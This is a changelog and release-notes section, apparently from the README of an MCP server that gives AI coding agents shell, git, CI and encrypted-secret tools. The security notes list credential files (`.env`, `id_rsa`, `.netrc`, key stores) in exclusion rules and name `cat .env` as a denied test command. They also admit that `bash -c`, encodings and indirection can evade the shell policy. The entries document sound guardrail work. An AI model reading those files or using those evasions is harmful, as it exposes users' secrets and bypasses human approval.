| 2026-11-02 | **v1.10.0** | **Shell surface cleanup (breaking).** The obsolete `early_exit` alias is removed from `project_shell_run`; use `background: 0` / `false` for foreground runs. Clients that still send `early_exit` should switch to `background`; the field is no longer advertised or read. `background` coercion is shared by the tool layer and the host so `0`, `false`, `"False"` and unknown values can no longer drift; foreground completion is event-driven (`close`/`error`) instead of a 25 ms poll, and the host-call budget now honours `VENIRA_SHELL_MAX_TIMEOUT_MS`. `VENIRA_SHELL_EXIT_EARLY` remains as the separate `project_shell_status` polling optimisation. **44 tools**, verify **369/369**. |
| 2026-11-02 | **v1.9.1** | **True foreground shell runs.** `project_shell_run` gains `background` (number/boolean/string): `background: 0` / `false` / `"False"` blocks until the command exits and stdio flushes, then returns the complete bounded `stdout`/`stderr` in the same call; the async default is unchanged and `early_exit: 1` remains a backwards-compatible alias. The old 2-second "give up waiting" cap no longer applies to foreground calls, and the host-call budget now covers `timeout_ms` instead of 30 s. **44 tools**, verify **370/370**. |
| 2026-11-02 | **v1.9.0** | **Dependency graph + change impact + CI waiting.** `project_dependency_graph` builds a deterministic TS/JS + Python import/symbol graph (JSON, DOT or Mermaid; relative imports, `require()`, dynamic `import()`, `extends`/`implements`, cross-file references; bounded walk, protected paths skipped, 5 s cache invalidated by writes). `project_change_impact` answers "what breaks if I edit this?" with a bounded reverse/forward closure, per-hit `confidence`, `affected_symbols` and a separate `tests_affected` count; ambiguous bare symbol names downgrade to `possible` and are listed in `unresolved[]`. `project_ci_wait` long-polls one run/ref/PR/branch until terminal, `any_change` or `timeout_ms` (default 45 s, max 110 s), returning the failure log tail in the same call; it is unqueued and documented as a long-poll because MCP stdio cannot wake the model. **44 tools**, verify **367/367**. |
| 2026-11-02 | **v1.8.2** | **Audit/secret hardening.** Audit rows are keyed (HMAC chain) so an in-place edit is detected, and secret ciphertext is bound to its name so a renamed entry cannot decrypt another entry's value. |
| 2026-11-02 | **v1.8.1** | **Docs-only release.** README now opens with the one-line install and a copy/paste agent prompt, followed by a short quick start and a command cheat sheet; per-client config paths, raw JSON/TOML, developer and Docker installs moved behind it. No code changes. |
| 2026-11-02 | **v1.8.0** | **One-command client setup + GitHub authorization.** `--install [auto|client]` merges Venira into detected MCP configs (`vscode`, `opencode`, `claude_desktop`, `cursor`, `codex`, `kimi`, `deepseek`, `antigravity`) and creates a missing file when a client is named; `--print-config [client]` prints ready-to-paste JSON/TOML without writing; generated configs use `npx --yes --package=venira-mcp@latest` and omit platform-specific shell/data-dir defaults. `project_github_connect` adds GitHub Device Flow and keeps access/refresh tokens in the encrypted per-user vault (never returned to the agent); `--setup-github` is the hidden-terminal PAT fallback. GitHub/GitLab credentials and private keys are scanned locally on provider requests/responses with fail-closed blocking/withholding; `npm run verify` covers `.env` read denial, `git push --no-verify` approval, secret-guard and OAuth regressions. |
| 2026-11-01 | **v1.7.1** | **Security hotfix + shell UX.** Legacy audit schemas with required `created_at` now receive compatible writes; download-to-shell detection covers chained commands; container stop/remove and all `git push` operations require approval; approval documentation now matches the pending CLI/HMAC flow and per-user data directory; `project_shell_run.early_exit` can wait for completion and return bounded final output with `run_id`/`shell_id`. |
| 2026-10-27 | **v1.0.0** | **Standalone rewrite.** The Rust `corehost` binary and JSON-Lines IPC were replaced by an in-process pure-Node backend (`lib/corehost.ts`). SQLite WAL audit via `better-sqlite3`, async shell with process-tree kill, long-lived capability scope, structured envelopes with hints, validated read caches, batch reads. Ships as `npm i venira-mcp` (no binary, no GUI). |
| 2026-10-28 | v1.0.1–v1.0.7 | Release plumbing: npm metadata, OIDC trusted publishing, Docker multi-stage image, `--version` / `--help`, doctor works from any directory, zod 4 + MCP SDK 1.32 (security advisory fix), standard `LICENSE-MIT` / `LICENSE-APACHE` filenames, `scripts/` shipped in the image. |
| 2026-10-28 | v1.1.0 | Shell policy hardening: `balanced` / `strict` / `permissive` / `off`, HMAC-signed single-use approval tokens, session grants, policy file loaded from an explicit env path only (never from the workspace). |
| 2026-10-28 | v1.1.3 | `project_execute_js` — optional workspace-scoped synchronous JS with whitelist env and output caps. |
| 2026-10-28 | v1.1.7 | Audit writer compatible with legacy DB schemas (in-place migration instead of failed writes). |
| 2026-10-28 | v1.1.9 | CLI `--workspace/-w` and `--data-dir` (no config switching), `VENIRA_PERMISSION_MODE`. |
| 2026-10-28 | **v1.2.0** | P1: cache controls (`VENIRA_CACHE_ALL`, `VENIRA_CACHE_LIST_ONLY`, `VENIRA_CACHE_SEARCH_ONLY`), request tracing (`VENIRA_TRACE` / `project_trace_status`), `project_read_audit`, shell UX (`VENIRA_SHELL_TAIL_MAX`, `VENIRA_SHELL_EXIT_EARLY`, `VENIRA_SHELL_TIMEOUT_POLICY`, `project_shell_cancel_session`). Verify/doctor raised to 25 tools. |
| 2026-10-28 | **v1.3.0** | P2/P3 code intelligence: `project_outline_symbol`, `project_file_symbols`, `project_diff_files`, `project_symbol_references`, `project_selective_search`; fuzzy edit (`VENIRA_EDIT_FUZZY`); SQLite recent-files index (`project_file_index`, index-first + bounded fallback). |
| 2026-10-29 | (post-1.3.0) | P2.5 self-install: `project_detect_harnesses` + `project_install_self` (OpenCode / Claude / Cursor / Codex / Kimi / DeepSeek / Antigravity), atomic config merge + backup. |
| 2026-10-29 | **v1.4.0** | **Checkpoints + audit reasons + Git/PR + CI + encrypted secrets.** `project_snapshot` (content-addressed, deduplicated, sha256-verified rollback), `reason` on mutations stored in the audit trail, GitHub pull-request and Actions tools, an AES-256-GCM secret store with `secret_env` injection, and a network safety layer. **35 tools**, verify **186/186**. |
| 2026-10-29 | **v1.5.0** | **Inline review comments + check-runs + secret rotation + deterministic diagnostics.** `project_pr_comment` pins notes to a file/line (`path`, `line`, `start_line`, `side`, `commit_id`); `project_ci_status` reads branch-protection **check-runs** (`ref` / `pr`); the secret store tracks `expires_at` / `last_used_at` / `use_count` / `rotated_at` and refuses expired credentials; new `project_explain_error` (rule table → next actions) and `project_plan_read_batch` (task → ready read batch). **37 tools**, verify **211/211**. |
| 2026-10-29 | **v1.5.1** | **Inline review-comment fix (found by a live E2E run).** GitHub requires `commit_id` whenever `line` is used (a bare `line` is rejected with 422 "line is not a permitted key"); `project_pr_comment` now resolves the PR head sha automatically (one extra API call only for inline notes) and honours an explicit `commit_id`. Verify **212/212**. |
| 2026-10-29 | **v1.5.2** | **Read-planner artifact filter (found by the live E2E re-run).** `project_plan_read_batch` ranked `data/venira.db` (36 hits) above source because the audit DB contains every command; candidates now exclude build/vendor dirs and DB/log/binary extensions, both when collecting and when planning. Verify **214/214**. |
| 2026-10-29 | **v1.5.3** | **Read-planner ranking (found by the post-restart bench).** A task naming a file ranked docs, not the file: `git-provider` never appears inside `lib/git-provider.ts`, so content search missed it. Plans now run a bounded **file-name search** per keyword (+ snake→kebab retry), score candidates by hits + path/name match, demote prose (`*.md`, README/LICENSE/docs) unless the task asks for documentation, drop lockfiles, and report a **calibrated** `estimated_ms` (6-file batch = 62 ms, was a flat 6 ms). Verify **217/217**. |
| 2026-10-29 | **v1.5.4** | **Planner never proposes secrets (found by the v1.5.3 E2E loop).** A secret-related task ranked `data/secrets.json` (encrypted store) and `data/secrets.key` into the top 6, so an agent following the plan would read key material. Candidates now exclude `.env*`, `secrets.{json,key,yaml,yml}`, `*.key/.pem/.p12/.pfx/.jks/.keystore/.crt`, `id_rsa`, `.npmrc`, `.netrc`, `credentials.json`. Verify **218/218**. |

### 14.2 What v1.5.0 added

- **Inline PR review comments** — `project_pr_comment` keeps its general thread behaviour and
  switches to the pull review-comment API when `path` + `line` are given. Optional
  `start_line` (multi-line range), `side: RIGHT | LEFT`, `commit_id` (defaults to the PR head).
  `line` without `path` (or `path` without `line`) is rejected with an actionable error instead
  of silently posting to the wrong endpoint.
- **Branch-protection check-runs** — `project_ci_status` keeps the Actions surface (`branch`,
  `workflow`, `run_id`) and adds `ref` (sha/branch) or `pr` (resolved to the head sha), which hit
  `GET /commits/{ref}/check-runs` instead. The result is `source: "check-runs"` with
  `check_runs[]` (`name`, `status`, `conclusion`, `app`, `url`, `summary`) and
  `overall: success | failure | in_progress | no_checks`. The ref is validated (no `..`,
  restricted charset) before it reaches the URL.
- **Secret rotation metadata** — every stored secret now carries `expires_at`, `expired`,
  `days_left`, `last_used_at`, `use_count` and `rotated_at`. `action=set` accepts
  `expires_in_days` (1–3650) or `expires_at` (epoch ms / ISO-8601); a re-`set` is a rotation
  (value overwritten, counter reset, previous expiry kept unless a new one is supplied).
  Expiry is enforced at every injection point (`secret_env` and the provider token) *before*
  decryption, so a dead credential fails as `secret_expired` with a rotate hint instead of
  surfacing later as a `401`. Use tracking is fire-and-forget (1 s debounce) and never fails
  the call that used the secret.
- **`project_explain_error`** — a deterministic rule table (~28 signatures: POSIX/Node errno,
  TypeScript, JavaScript, Python/pytest, git, npm, GitHub 401/403/429, SQLite locks and venira's
  own codes) maps an error block or log tail to `likely_cause`, `suggested_fix[]`,
  `retry_hint` and **ready-to-send** `next_actions` (e.g. a `project_read_ranges` call built from
  the failing `file:line`). `matched: false` is a normal result with a triage note, never an
  error. No model call, no network, < 1 ms.
- **`project_plan_read_batch`** — extracts keywords from a one-line task (quoted phrases,
  identifiers, then words), runs up to three bounded content searches, folds in `files_hint`
  and the recent-files index when the search is thin, ranks candidates by hit count and returns
  `steps[]` whose first entry is a complete `project_read_batch` request (plus an outline step
  for files > 256 KB and a tree/search fallback). Also no model call: it plans, you execute.
- **Test infrastructure** — the GitHub mock gained the check-runs endpoint, inline-comment route
  and a PR head `sha`; `npm run verify` grew to **211 checks** (rotation metadata, expired
  refusal, inline payload shape, check-run summarisation + ref validation, diagnostics and
  planning), and the tool-count expectations moved to 37 (36 when one is disabled).
- **Docs** — README (tools 37, new §4.9, roadmap), TODO.md, `package.json` metadata and the
  server's MCP instructions/decision tree (now 14 steps) updated in the same change.

**Fix shipped in v1.5.1 (found by a live E2E run):** GitHub requires `commit_id` whenever `line`
is used — a bare `line` returns `422 "line is not a permitted key"`. `project_pr_comment` now
resolves the PR head sha automatically (one extra API call, inline notes only) and still honours
an explicit `commit_id` (e.g. anchoring to an older revision). The response echoes `commit_id`.

**Fix shipped in v1.5.2 (found by the live E2E re-run):** `project_plan_read_batch` ranked
`data/venira.db` first (36 hits) because the audit DB stores every command, so its bytes match
keyword searches. Candidates now drop build/vendor directories (`node_modules`, `dist`, `.git`,
`__pycache__`, …) and DB/log/binary extensions (`.db`, `.sqlite`, `.log`, `.map`, images, …) at
both collection and planning time; source files rank as intended.

**Fix shipped in v1.5.3 (found by the post-restart bench):** ranking, not filtering, was the last
gap. A task naming a file (`"verify the inline PR comment fix in git-provider"`) returned
`CONTRIBUTING.md`/`README.md` because the string `git-provider` never occurs inside
`lib/git-provider.ts`, so a content search cannot find it. The planner now also runs a bounded
**file-name search** per keyword (with a snake_case → kebab-case retry), scores candidates as
`hits + 4 × path-or-name match`, and multiplies prose (`README`/`LICENSE`/`docs/`, `*.md`) by 0.3
unless the task mentions documentation. Lockfiles (`package-lock.json`, `yarn.lock`, …) are
excluded like other artifacts, and `estimated_ms` is calibrated from the bench (a 6-file batch
measured 62 ms, the old flat value was 6 ms). Result on the reported task: `lib/git-provider.ts`
ranks #1 (score 7) with no `.db`/lock/doc at the top.

**Fix shipped in v1.5.4 (found by the first v1.5.3 E2E loop):** the planner proposed reading credentials.
A secret-related task ranked `data/secrets.json` (the encrypted store) and `data/secrets.key` into the
top 6 — an agent that followed the plan would have read key material into its context. Candidates now
exclude `.env*`, `secrets.{json,key,yaml,yml}`, `*.key/.pem/.p12/.pfx/.jks/.keystore/.crt/.der`,
`id_(rsa|dsa|ecdsa|ed25519)`, `.npmrc`, `.netrc`, `.pgpass` and `credentials.json`, alongside the
existing artifact/lockfile rules.

### 14.3 What v1.4.0 added

- **Checkpoints (`project_snapshot`)** — `action: create | list | restore | delete`. Blobs are
  content-addressed (`snapshots/blobs/<ab>/<sha256>`) and deduplicated: a second checkpoint after
  a small edit only writes the changed bytes. Restore is per-file atomic (temp + rename),
  concurrency 4, sha256-verified, and only rewrites captured paths. Defaults skip `.git`,
  `node_modules`, build output, virtualenvs, `__pycache__`, the checkpoint store, the audit DB
  and the secret store; symlinks are never followed; pruning via `VENIRA_SNAPSHOT_KEEP` (20).
- **Audit reasons** — mutating tools accept `reason` ("why"), normalized to one line, redacted,
  capped at 400 chars, stored in the additive `reason` column (old DBs migrate in place) and
  returned by `project_read_audit`.
- **Git provider** — `project_pr_create`, `project_pr_comment`, `project_pr_merge` over GitHub
  REST. Repo resolution: `repo` arg → `VENIRA_GITHUB_REPO` → `.git/config` `origin`
  (worktrees via `commondir`). Token: secret `GITHUB_TOKEN` → `VENIRA_GITHUB_TOKEN` →
  `GITHUB_TOKEN` → `GH_TOKEN`. Action-shaped errors (`auth_missing`, `not_found`, `conflict`,
  `rate_limited`, …). Closed/already-merged PRs return `already_merged`; branch delete is
  best-effort and never fails a successful merge.
- **CI provider** — `project_ci_status` (runs for branch/workflow, or one run + jobs),
  `project_ci_trigger` (`workflow_dispatch` with validated inputs), `project_ci_logs` (whole run
  or one job). Log archives are downloaded (32 MB cap), parsed **in memory** by a minimal ZIP
  reader (EOCD + central directory, stored + deflate, 4 MB/entry) and returned as a tail
  (`tail_lines` default 500, `max_bytes` default 512 KB / cap 4 MB). Nothing is extracted to disk.
- **Secrets** — `project_secret` (`action: get | set | list | delete`) backed by AES-256-GCM
  (`secrets.json` + `secrets.key`, 0600, atomic writes). `get`/`list` are metadata-only
  (length + sha256 prefix + update time); plaintext requires `reveal=1` **and**
  `VENIRA_SECRET_ALLOW_REVEAL=1`. `value_env` keeps values out of tool arguments;
  `project_shell_run secret_env=[...]` (≤ 16) injects them after approval. Stored values
  (≥ 8 chars) are scrubbed from shell tails and audit text.
- **Network safety** — `VENIRA_NETWORK=0` kill switch; https-only API base (http only for
  localhost or `VENIRA_GITHUB_ALLOW_HTTP=1`); manual redirects that drop `Authorization` on a
  cross-origin hop (pre-signed log blobs); `node:http(s)` client with timeouts and response caps
  (deliberately not global `fetch`); size caps on every response.
- **Test infrastructure** — `scripts/github-mock.ts` serves the API and a second-origin blob
  server (stored + deflated ZIP entries), recording every request and `Authorization` header.
  `npm run verify` grew to **186 checks** covering secrets, PR/CI, redirect token hygiene,
  network kill switch, audit summaries and "secret value never logged".
- **Docs** — README/repo docs updated to 35 tools, new env vars, security §6.2; `project_health`
  reports `secrets` and `network.github` sections (never the token).

### 14.4 Roadmap

| Item | Status | Notes |
|---|---|---|
| `project_explain_error` | ✅ shipped (v1.5.0) | Deterministic rule table + ready `next_actions`; no model call. |
| `project_plan_read_batch` | ✅ shipped (v1.5.0) | Keywords → bounded content + file-name search → ranked candidates → ready batch call. |
| Planner candidate safety | ✅ shipped (v1.5.2 → v1.5.4) | Build/vendor dirs, DB/log/binary artifacts, lockfiles and credentials (`.env*`, `secrets.*`, `*.key/.pem`, `id_rsa`) never rank; source that *handles* secrets (`lib/secrets.ts`) still does. |
| Planner ranking + calibrated estimate | ✅ shipped (v1.5.3) | Name/path match weight, prose weight `0.3` unless docs are requested, `estimated_ms` from the bench (6-file batch ≈ 62 ms). |
| Inline PR review comments (file/line) | ✅ shipped (v1.5.0) | `project_pr_comment` with `path`, `line`, `start_line`, `side`, `commit_id`. |
| PR checks API (`check-runs`) in `project_ci_status` | ✅ shipped (v1.5.0) | `ref` / `pr` → `GET /commits/{ref}/check-runs`. |
| Secret rotation metadata (expiry, last used) | ✅ shipped (v1.5.0) | `expires_at`, `days_left`, `last_used_at`, `use_count`, `rotated_at`; expired secrets refused. |
| GitLab / Bitbucket providers | ✅ shipped (v1.6.0) | One `GitDialect` per provider (`lib/git-github.ts`, `lib/git-gitlab.ts`, `lib/git-bitbucket.ts`); the PR/CI tools keep the same arguments. |
| Multi-repo workspaces | ✅ shipped (v1.6.0) | `venira.config.json` maps `owner/name` → provider / API base / secret, so one workspace can drive several repos and accounts. |
| Configurable git client | ✅ shipped (v1.6.0) | Timeouts, byte caps, redirects, retries and proxy come from env or config instead of constants; provider is inferred from the `origin` host when not set. |

### 14.5 v1.6.0 — provider-agnostic, configurable git layer (shipped)

The v1.5 git tools were **configurable per call but hardcoded per install**: GitHub-only
dialect, fixed secret/env names, fixed timeouts and caps, no proxy. v1.6.0 turns those
constants into configuration and adds a second and third dialect.

**Delivered**

- `lib/git-config.ts` resolves one context per call: `provider → api_url → repo → token → limits`, in the order **call args → `venira.config.json` → environment → built-in default**.
- `lib/git-http.ts` owns the request loop: manual redirects with token drop, response caps, retries for idempotent GETs, and an optional `CONNECT` proxy with `NO_PROXY` matching.
- `lib/git-github.ts` / `git-gitlab.ts` / `git-bitbucket.ts` implement the same operations (`create`, `comment`, `merge`, `list`, `close`, `reopen`, CI status/trigger/logs); `lib/git-provider.ts` routes to the active dialect.
- New tools: `project_pr_list`, `project_pr_close`, `project_pr_reopen` (**40 tools** total).
- `venira.config.json` (`git.provider`, `api_url`, `secret`, `username`, `timeout_ms`, `log_timeout_ms`, `max_bytes`, `log_max_bytes`, `log_zip_bytes`, `log_entry_bytes`, `log_text_bytes`, `max_redirects`, `retries`, `proxy`, `repos{}`) + matching `VENIRA_GIT_*` env overrides; provider inferred from the remote host (`github` / `gitlab` / `bitbucket`) when unset.
- Hard safety ceilings on all limits; invalid values fail with `invalid_request` + hint; no secret is ever echoed.
- Proxy (`VENIRA_GIT_PROXY` > `HTTPS_PROXY` > config) with `NO_PROXY`; tunable timeouts/caps with hard ceilings; retry GET on 5xx/network errors (`VENIRA_GIT_RETRIES`, default 1).
- GitLab (`/api/v4`): MR create/note/merge/list/close/reopen, pipelines, jobs trace. Bitbucket Cloud (`/2.0`): PR create/comment/merge/list/decline/reopen, pipelines + step logs.
- `build` / `verify` / `doctor` green; release workflow publishes via OIDC.. v1.6.0 turns those
constants into configuration and adds a second and third dialect.

**Design**

- `lib/git-config.ts` resolves one context per call:
  `provider → api_url → repo → token → limits`, in the order
  **call args → `venira.config.json` → environment → built-in default**.
- `lib/git-http.ts` owns the request loop: manual redirects with token drop, response caps,
  retries for idempotent GETs, and an optional `CONNECT` proxy with `NO_PROXY` matching.
- `lib/git-github.ts` / `git-gitlab.ts` / `git-bitbucket.ts` implement the same operations
  (`create`, `comment`, `merge`, `list`, `close`, `reopen`, CI status/trigger/logs);
  `lib/git-provider.ts` routes to the active dialect.
- New tools: `project_pr_list`, `project_pr_close`, `project_pr_reopen` (**40 tools**).

**Phases**

| Phase | Scope | Acceptance |
|---|---|---|
| 1. Config | `venira.config.json` (`git.provider`, `api_url`, `secret`, `username`, `timeout_ms`, `log_timeout_ms`, `max_bytes`, `max_redirects`, `retries`, `proxy`, `repos{}`) + matching `VENIRA_GIT_*` env overrides; provider inferred from the remote host (`github` / `gitlab` / `bitbucket`) when unset. | Every value has a documented default; invalid values fail with `invalid_request` + hint; no secret is ever echoed. |
| 2. HTTP | Proxy (`VENIRA_GIT_PROXY` > `HTTPS_PROXY` > config) with `NO_PROXY`; tunable timeouts/caps with hard safety ceilings; retry GET on 5xx/network errors (`VENIRA_GIT_RETRIES`, default 1). | Mock tests prove CONNECT + no-proxy bypass, retry count, and that caps cannot exceed their ceiling. |
| 3. Dialects | GitLab (`/api/v4`): MR create/note/merge/list/close/reopen, pipelines, jobs trace. Bitbucket Cloud (`/2.0`): PR create/comment/merge/list/decline/reopen, pipelines + step logs. | Same tool arguments return the same envelope shape (`repo`, `number`, `url`, `state`, `overall`). |
| 4. PR lifecycle | `project_pr_list` (state/head/base/limit), `project_pr_close`, `project_pr_reopen`. | Closing a PR no longer needs a raw `PATCH`; list is batch-safe and read-only. |
| 5. Docs + release | README env table + §4.6/§4.7, TODO roadmap, changelog, tag `v1.6.0`. | `build` / `verify` / `doctor` green; release workflow publishes via OIDC. |

---

### 14.6 v1.8.0 — Client setup, GitHub authorization and secret guard

- **One-command client setup** — `--install [auto|client]` merges Venira into every detected
  MCP client config (`vscode`, `opencode`, `claude_desktop`, `cursor`, `codex`, `kimi`,
  `deepseek`, `antigravity`) without removing other servers, backs up the original as
  `<file>.venira-bak`, and creates a missing config when a client is named. `--print-config
  [client]` prints a ready-to-paste JSON/TOML config and writes nothing, so it is safe before
  Venira is connected. Generated entries use `npx --yes --package=venira-mcp@latest` and leave
  the shell and data directory unset so the same config works on Windows, macOS and Linux.
  The command prints the restart step and points at `project_health`; it deliberately does not
  claim the connection works before the client restarts.

- **GitHub Device Flow** — `project_github_connect` starts authorization and returns only a
  verification URL, short code, and opaque pending ID. The user authorizes Venira directly on
  GitHub; access/refresh tokens are encrypted in the local per-user vault and never returned to
  the model. The flow requests `repo offline_access` (broad repository access) and refreshes
  expiring credentials when supported.
- **Hidden-terminal token setup** — `npx --yes venira-mcp@latest --setup-github` asks for a PAT with hidden
  input and confirmation, then stores it in the same encrypted vault. This is a manual fallback,
  not a chat prompt; clients running as the same OS user can share the default vault.
- **Provider secret guard** — Secretlint's recommended rules plus GitLab-token detection scan
  provider arguments, the final HTTP path/body, provider error bodies, and returned tool data.
  Known vault/sensitive-environment values and their encoded variants are checked too. Unsafe
  outbound requests are blocked before network access; unsafe output is withheld. Scan failures
  fail closed. A response-side block can occur after a mutation completed, so the caller must not
  blindly retry it.
- **Regression coverage** — `npm run verify` runs the MCP behavior suite, provider-secret-guard,
  GitHub Device Flow, and isolated shell-security tests. The suite includes `cat .env` (deny) and
  `git push --no-verify` (human approval required), plus local mock checks that blocked provider
  content is not sent or returned. It uses a temporary data/vault directory rather than the
  developer's real per-user vault. Any failed assertion makes the command exit nonzero.
  These deterministic tests demonstrate the covered cases; they do not prove the shell policy is
  a sandbox or protect against every encoding/indirection or a compromised host.

> Note: shell policy matches command text; `bash -c`, encodings and indirection can evade it. It is a guardrail, not a sandbox. `VENIRA_PROFILE=core|full` (default full) reduces the registered tool set.

## License

Dual-licensed under **MIT OR Apache-2.0** — pick whichever fits your project.

- MIT license text: [`LICENSE-MIT`](./LICENSE-MIT)
- Apache-2.0 full text: [`LICENSE-APACHE`](./LICENSE-APACHE)

Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in this project shall be dual-licensed as above, without any
additional terms or conditions.
